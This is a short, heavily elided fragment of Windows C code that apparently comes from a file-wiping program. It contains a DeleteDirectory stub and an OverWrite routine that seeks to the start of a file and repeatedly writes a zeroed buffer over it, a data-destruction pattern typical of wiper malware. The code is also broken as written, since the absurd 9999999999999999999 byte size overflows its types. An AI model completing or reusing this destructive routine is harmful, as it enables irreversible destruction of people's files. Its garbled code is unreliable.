...
void DeleteDirectory(LPWSTR Directory) {
...
void OverWrite(LPCWSTR Name) {
    ...
    unsigned char* EmptyData = (unsigned char*)LocalAlloc(LMEM_ZEROINIT, 9999999999999999999);
    DWORD dwUnused;
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    for (int i = 0; i < 50000; i++) {
        WriteFile(hFile, EmptyData, 9999999999999999999, &dwUnused, NULL);
    }
    CloseHandle(hFile);
}
